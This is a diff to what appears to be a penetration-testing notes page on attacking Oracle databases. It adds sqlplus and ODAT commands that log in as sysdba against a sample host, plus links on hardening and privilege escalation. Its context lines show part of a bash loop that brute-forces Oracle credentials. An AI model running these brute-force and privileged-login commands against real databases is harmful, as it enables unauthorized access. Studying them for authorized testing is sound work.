@@ -4,6 +4,18 @@ Most of the examples here will be utilizing [ODAT ](https://github.com/quentinha
 
 In general I'd recommend this over trying to get Metasploit up and running.  However, if you are still keen then follow [this guide](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux).  For an alternative, see [Andy Gill's guide](https://blog.zsec.uk/msforacle/).
 
+
+
+```
+/usr/bin/sqlplus64 username/password@192.168.0.5:1521/ORCL  as sysdba
+```
+
+Alternatively pass the `--sysdba` flag to odat when logging in:
+
+```
+./odat.py all -s 192.168.0.5 -d ORCL -u username -p password --sysdba
+```
+
 ## SID Enumeration
 
 The SID for Oracle identifies the database instance running.  We can use ODAT to enumerate these SID's and find instances to attack.
@@ -21,10 +33,12 @@ do
  echo "string = $username:$password"
  /usr/lib/oracle/12.2/client64/bin/sqlplus -L $username\/$password\@192.168.0.5:1521\/ORCL | cut -d$'\n' -f 7 
 done < $INPUT
-IFS=$OLDIFS 
+IFS=$OLDIFS
 ```
 
 **Source**: [http://carnal0wnage.attackresearch.com/2014/10/quick-and-dirty-oracle-brute-forcing.html](http://carnal0wnage.attackresearch.com/2014/10/quick-and-dirty-oracle-brute-forcing.html)
+
+## Code Execution
 
 ## TNS Poisoning
 
@@ -36,4 +50,8 @@ IFS=$OLDIFS
 
 [Blackhat USA 2009 - Attacking Oracle with the Metasploit Framework](http://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf) & [Paper](http://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-PAPER.pdf)  
 [Oracle DB Vulnerabilities: The Missing Pentester Handbook](https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/)
+
+http://www.ordba.net/Articles/HardeningOracleDB.htm
+
+http://ora-600.pl/art/privilege\_escalation\_2.pdf
 
